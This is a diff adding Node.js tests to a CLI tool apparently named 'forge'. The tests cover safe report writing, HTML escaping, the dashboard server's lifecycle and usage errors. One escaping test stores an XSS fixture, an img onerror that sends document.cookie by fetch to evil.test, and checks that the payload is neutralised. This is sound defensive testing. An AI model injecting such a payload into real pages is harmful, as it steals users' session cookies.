@@ -230,6 +230,82 @@ test("rank: a report with an atlas, exit 1 without one", () => {
   }
 });
 
+test("report: the default path, a named path, and refusals that protect other files", () => {
+  const r = check("report", ["report"], 0);
+  assert.ok(r.path.endsWith(join(".forge", "report.html")));
+  const named = check("report", ["report", "--out", "snapshot.html"], 0);
+  assert.equal(named.path, join(root, "snapshot.html"));
+  // A second run may overwrite its own earlier report…
+  check("report", ["report", "--out", "snapshot.html"], 0);
+  // …but never a file it did not write, unless told to.
+  put("notes.html", "<p>mine</p>\n");
+  const refused = forge(["report", "--out", "notes.html", "--json"]);
+  assert.equal(refused.code, 1);
+  assert.deepEqual(violations(JSON.parse(refused.stdout), CONTRACTS["report refused"].spec), []);
+  assert.equal(readFileSync(join(root, "notes.html"), "utf8"), "<p>mine</p>\n");
+  assert.equal(forge(["report", "--out", "notes.html"]).code, 1);
+  check("report", ["report", "--out", "notes.html", "--force"], 0);
+  assert.equal(forge(["report", "--out", "no-such-dir/r.html"]).code, 1);
+  assert.equal(forge(["report", "--out", "src"]).code, 1, "a directory is refused");
+  for (const f of ["snapshot.html", "notes.html"]) rmSync(join(root, f));
+});
+
+test("report: text others wrote is escaped, and the page can run nothing", async () => {
+  const { renderReport, REPORT_POLICY } = await import("../src/report.js");
+  const { mintClaim } = await import("../src/ledger.js");
+  const { putClaim, repoLedger } = await import("../src/ledger_store.js");
+  const hostile =
+    '<img src=x onerror="fetch(`//evil.test/`+document.cookie)"><script>alert(1)</script>';
+  const minted = mintClaim({
+    kind: "fact",
+    body: { name: "hostile", text: hostile },
+    scope: { level: "repo" },
+    provenance: { author: "someone-else", agent: "test" },
+    t: 1,
+  });
+  assert.ok(minted.ok);
+  putClaim(repoLedger(root), minted.claim);
+  const html = renderReport(root);
+  assert.ok(!html.includes("<script>alert"), "no raw script from a claim");
+  assert.ok(!html.includes("<img src=x"), "no raw tag from a claim");
+  assert.ok(html.includes("&lt;script&gt;alert(1)&lt;/script&gt;"));
+  assert.ok(html.includes(`content="${REPORT_POLICY}"`));
+  assert.equal((html.match(/<script\b/g) ?? []).length, 0, "the report has no script at all");
+});
+
+test("dash --json: one line once listening, then a clean stop; a busy port exits 1", async () => {
+  const { spawn } = await import("node:child_process");
+  const child = spawn(process.execPath, [CLI, "dash", "--port", "0", "--json"], {
+    cwd: root,
+    env: { ...process.env, NO_COLOR: "1" },
+  });
+  const line = await new Promise((resolve, reject) => {
+    let out = "";
+    child.stdout.on("data", (b) => {
+      out += b;
+      if (out.includes("\n")) resolve(out.split("\n")[0]);
+    });
+    child.on("exit", (code) => reject(new Error(`dash exited ${code} before listening`)));
+    setTimeout(() => reject(new Error("dash did not start")), 20000);
+  });
+  const body = JSON.parse(String(line));
+  assert.deepEqual(violations(body, CONTRACTS.dash.spec), []);
+  assert.ok(!String(line).includes("token"), "the write token is never printed");
+  const page = await fetch(`${body.url}/`);
+  assert.equal(page.status, 200);
+  // The port is now taken: a second server on it is refused with a reason, not a stack trace.
+  const busy = forge(["dash", "--port", String(body.port), "--json"]);
+  assert.equal(busy.code, 1);
+  assert.deepEqual(violations(JSON.parse(busy.stdout), CONTRACTS["dash refused"].spec), []);
+  assert.match(JSON.parse(busy.stdout).error, /is in use/);
+  const exited = new Promise((resolve) =>
+    child.once("exit", (code, signal) => resolve({ code, signal })),
+  );
+  child.kill(process.platform === "win32" ? undefined : "SIGTERM");
+  const end = /** @type {{code: number|null, signal: string|null}} */ (await exited);
+  if (process.platform !== "win32") assert.equal(end.code, 0, "SIGTERM is a clean stop");
+});
+
 test("usage errors: exit 1, nothing on stdout, a reason on stderr", () => {
   const cases = [
     [["deja", "--json"], /usage/],
@@ -252,6 +328,10 @@ test("usage errors: exit 1, nothing on stdout, a reason on stderr", () => {
     [["reuse", "query", "x", "--file", "a.js"], /--file applies to mint, not query/],
     [["taste", "a", "b"], /usage/],
     [["collide", "--json=yes"], /--json takes no value/],
+    [["report", "--force"], /--force only applies together with --out/],
+    [["report", "--out"], /--out needs a value/],
+    [["dash", "--port", "70000"], /--port must be a whole number from 0 to 65535/],
+    [["dash", "--prot", "1"], /unknown flag --prot \(did you mean --port\?\)/],
   ];
   for (const [args, reason] of cases) {
     const r = forge(/** @type {string[]} */ (args));
